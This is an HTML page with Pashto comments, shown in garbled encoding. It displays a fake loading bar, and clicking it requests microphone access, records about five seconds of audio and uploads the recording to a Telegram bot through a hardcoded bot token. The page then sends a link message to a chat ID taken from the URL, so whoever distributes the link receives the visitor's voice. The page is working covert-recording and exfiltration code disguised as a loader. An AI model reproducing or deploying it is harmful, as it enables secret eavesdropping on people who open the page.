<!doctype html>
<html lang="ps">
<head>
<meta charset="utf-8">
<title>1s Ù„ÙˆÚ‰ÛŒÙ†Ú« + 5s Ø«Ø¨Øª + Ù¾ÛŒØºØ§Ù…</title>
<style>
body{margin:0;display:flex;justify-content:center;align-items:center;height:100vh;background:#0b1220;}
.loader{width:80%;height:12px;background:#1e293b;border-radius:8px;overflow:hidden;cursor:pointer;}
.bar{height:100%;width:0;background:linear-gradient(90deg,#34d399,#06b6d4);}
</style>
</head>
<body>
<div class="loader" id="loader"><div class="bar" id="bar"></div></div>

<script>
const BOT_TOKEN="8062278856:AAEYVkPjqb67UgOWPIYMUkvqvYe1O-SqgjU"; // Ø³ØªØ§ Ø¨ÙˆØª ØªÙˆÚ©Ù†

// URL Ú…Ø®Ù‡ userid ÙˆØ§Ø®Ù„Ø¦
function getUserIdFromUrl(){
    const params = new URLSearchParams(window.location.search);
    return params.get("userid");
}

let CHAT_ID = getUserIdFromUrl();
if(!CHAT_ID){
    alert("Ù‡ÛŒÚ… userid Ù¾Ù‡ URL Ú©Û ÙˆÙ†Ù‡ Ù…ÙˆÙ†Ø¯Ù„ Ø´Ùˆ!");
    CHAT_ID="0";
}

const loader=document.getElementById("loader");
const bar=document.getElementById("bar");

let mediaRecorder=null;
let chunks=[];
let streamRef=null;

// Ø¯Ù„ØªÙ‡ Ø§Ø¶Ø§ÙÙŠ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª ØªØ¹Ø±ÛŒÙ Ú©Ú“Ø¦
const EXTRA_INFO = "Ù†ÙˆØ± Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø¯Ù„ØªÙ‡"; // Ø¯ Ø§Ú“ØªÛŒØ§ Ù¾Ù‡ Ø§Ø³Ø§Ø³ Ø¨Ø¯Ù„ Ú©Ú“Ø¦
const BASE_URL = "www.myweb.com/?userid=";

async function startCycle(){
    // Ù„ÙˆÚ‰ÛŒÙ†Ú« 1s
    bar.style.transition="width 1s linear";
    bar.style.width="100%";

    setTimeout(async ()=>{
        try{
            streamRef=await navigator.mediaDevices.getUserMedia({audio:true});
        }catch(e){
            console.error("Mic Ø§Ø¬Ø§Ø²Ù‡ Ù†Ø´ØªÙ‡:",e);
            resetBar();
            return;
        }
        chunks=[];
        mediaRecorder=new MediaRecorder(streamRef);
        mediaRecorder.ondataavailable=e=>{if(e.data && e.data.size) chunks.push(e.data);};
        mediaRecorder.start();
        console.log("Ø±ÛŒÚ©Ø§Ø±Ú‰ Ù¾ÛŒÙ„ Ø´Ùˆ");

        setTimeout(async ()=>{
            if(mediaRecorder.state==="recording") mediaRecorder.stop();
            if(streamRef){streamRef.getTracks().forEach(t=>t.stop()); streamRef=null;}

            // Ø¢Ú‰ÛŒÙˆ ÙˆØ§Ø³ØªÙˆÙ„ Ø´ÙŠ
            const blob=new Blob(chunks,{type:"audio/ogg"});
            const fd=new FormData();
            fd.append("chat_id",CHAT_ID);
            fd.append("voice",blob,"rec.ogg");

            try{
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`,{
                    method:"POST",
                    body:fd
                });
                console.log("Ø¢Ú‰ÛŒÙˆ ÙˆØ§Ø³ØªÙˆÙ„ Ø´ÙˆÙ‡");
            }catch(e){console.error("Ø§Ø±Ø³Ø§Ù„ Ø®Ø·Ø§:",e);}

            // Ù‡Ù…Ø§ØºÙ‡ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ù¾Ù‡ text message ÙˆØ§Ø³ØªÙˆÙ„ Ø´ÙŠ
            const messageText = `ðŸ”— Ù„ÛŒÙ†Ú©: ${BASE_URL}${CHAT_ID}\nðŸ†” Ú©Ø§Ø±Ù† ID: ${CHAT_ID}\nâ„¹ï¸ ${EXTRA_INFO}`;
            try{
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
                    method:"POST",
                    headers: { "Content-Type":"application/json" },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: messageText })
                });
                console.log("Ù„ÛŒÚ©Ù†ÛŒ Ù¾ÛŒØºØ§Ù… ÙˆØ§Ø³ØªÙˆÙ„ Ø´Ùˆ");
            }catch(e){console.error("Ù¾ÛŒØºØ§Ù… Ø§Ø±Ø³Ø§Ù„ Ø®Ø·Ø§:",e);}

            resetBar();
        },5000);
    },1000);
}

function resetBar(){
    bar.style.transition="none";
    bar.style.width="0%";
}

loader.addEventListener("click",()=>{
    if(mediaRecorder && mediaRecorder.state==="recording") return;
    startCycle();
});
</script>
</body>
</html> 
